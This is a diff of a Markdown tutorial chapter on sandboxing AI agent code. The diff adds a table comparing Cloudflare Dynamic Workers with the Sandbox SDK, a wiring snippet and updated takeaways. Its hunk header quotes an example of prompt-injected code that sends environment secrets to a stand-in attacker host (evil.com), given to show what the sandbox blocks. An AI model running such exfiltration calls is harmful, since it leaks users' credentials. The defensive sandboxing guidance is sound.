@@ -57,10 +57,41 @@ Suppose injected code tries: `await fetch("https://evil.com/?leak=" + process.en
 
 ---
 
-## 05.3 Key takeaways
+## 05.3 Cloudflare Sandbox SDK (GA) vs. Dynamic Workers
 
-1. **Dynamic Workers boot in milliseconds** (~100× faster than containers) with strong V8 memory isolation.
+Cloudflare ships **two distinct sandbox primitives** — choosing the right one depends on whether your agent needs **JS/TS API glue** or a **full Linux OS**:
+
+| Feature | **Dynamic Workers** (`env.LOADER`) | **Cloudflare Sandbox SDK (GA)** (`@cloudflare/sandbox`) |
+| :--- | :--- | :--- |
+| **Underlying Runtime** | V8 Isolate | Durable Object + Linux Container |
+| **Cold Start** | **~2–5 ms** | **~1–2 s** (warm sleep/wake lifecycle) |
+| **Languages & Binaries** | JS / TS only | Full Linux (`bash`, `python3`, `git`, `pip`, `npm`, CLI binaries) |
+| **Filesystem** | Ephemeral / in-memory | Persistent container filesystem + bucket mounts + backups |
+| **Processes & Ports** | Single short-lived `execute()` | `exec()`, `startProcess()`, `terminal()`, **preview URLs** (`exposePort`) |
+| **Best For** | Code Mode (`codeMcpServer` / `openApiMcpServer`) | SWE coding agents, Python data analysis, git workflows, OpenAI Agents SDK |
+
+### Wiring `@cloudflare/sandbox` with OpenAI Agents SDK
+When an OpenAI Agent needs a persistent Linux workspace (instead of just JS/TS Code Mode), bind a Durable Object `Sandbox` namespace and expose `exec` / `files` / `preview` tools using the stable `@cloudflare/sandbox` contract:
+
+```ts
+import { getSandbox, Sandbox } from "@cloudflare/sandbox";
+export { Sandbox };
+
+// Bind each user or conversation thread to an isolated Linux container
+const sandbox = getSandbox(env.Sandbox, `thread-${threadId}`);
+const result = await sandbox.exec('python3 -c "print(2 + 2)"');
+// result -> { stdout, stderr, exitCode, success }
+```
+
+- **References:** [Cloudflare Sandbox GA](https://blog.cloudflare.com/sandbox-ga/) · [Dynamic Workers](https://blog.cloudflare.com/dynamic-workers/) · [Agents Sandbox Tools](https://developers.cloudflare.com/agents/tools/sandbox/) · [OpenAI Agents + Cloudflare Sandbox Tutorial](https://developers.cloudflare.com/sandbox/sdk/tutorials/openai-agents/)
+
+---
+
+## 05.4 Key takeaways
+
+1. **Dynamic Workers boot in milliseconds** (~100× faster than containers) with strong V8 memory isolation for JS/TS Code Mode.
 2. **`globalOutbound: null` + Host RPC Proxy** guarantees zero credential leakage even if prompt-injected code runs inside the sandbox.
+3. **Use `@cloudflare/sandbox` (GA)** when the agent needs a **full Linux OS** (`python3`, `bash`, `git`, preview URLs, or OpenAI Agents SDK workspace sessions).
 
 ---
 
